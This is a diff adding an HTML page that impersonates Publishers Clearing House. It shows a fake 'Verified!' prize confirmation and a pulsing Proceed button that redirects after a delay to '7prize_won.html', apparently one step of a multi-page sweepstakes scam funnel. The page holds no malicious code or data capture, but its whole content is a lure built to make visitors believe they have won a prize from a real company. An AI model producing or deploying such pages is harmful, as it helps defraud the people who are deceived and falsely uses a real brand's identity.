@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PCH Giveaway - Prize Confirmation</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Arial', sans-serif; }
+
+body {
+    background: #ffffff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+}
+
+/* Top banner */
+.banner {
+    width: 100%;
+    background: #fbc02d;
+    color: #ffffff;
+    font-weight: bold;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 10px 0;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+
+.banner-content {
+    display: flex;
+    align-items: center;
+}
+
+.banner-logo {
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    background-image: url('pch_logo.jpg');
+    background-size: cover;
+    background-position: center;
+    margin-right: 10px;
+}
+
+.banner-text {
+    font-size: 1.2em;
+}
+
+/* Container */
+.container {
+    background: #fff9c4;
+    padding: 40px 30px;
+    border-radius: 20px;
+    max-width: 450px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+    margin-top: 30px;
+}
+
+h1 {
+    color: #fbc02d;
+    margin-bottom: 20px;
+}
+
+p {
+    margin-bottom: 25px;
+    font-size: 1.1em;
+}
+
+/* Proceed button */
+button {
+    padding: 12px 25px;
+    border: none;
+    border-radius: 10px;
+    background: #fbc02d;
+    color: #fff;
+    font-size: 1em;
+    cursor: pointer;
+    animation: zoom 1s infinite alternate;
+    transition: 0.3s;
+}
+
+button:hover {
+    transform: scale(1.05);
+}
+
+@keyframes zoom {
+    0% { transform: scale(1); }
+    100% { transform: scale(1.1); }
+}
+</style>
+</head>
+<body>
+
+<div class="banner">
+    <div class="banner-content">
+        <div class="banner-logo"></div>
+        <span class="banner-text">PUBLISHERS CLEARING HOUSE</span>
+    </div>
+</div>
+
+<div class="container">
+    <h1>Verified!</h1>
+    <p>Your selection has been confirmed. Your prize is ready to be revealed!</p>
+    <button id="proceedBtn">Proceed</button>
+</div>
+
+<script>
+document.getElementById('proceedBtn').addEventListener('click', function(){
+    this.disabled = true;
+    this.innerText = "Loading...";
+    setTimeout(()=>{ window.location.href = "7prize_won.html"; }, 3000);
+});
+</script>
+
+</body>
+</html>
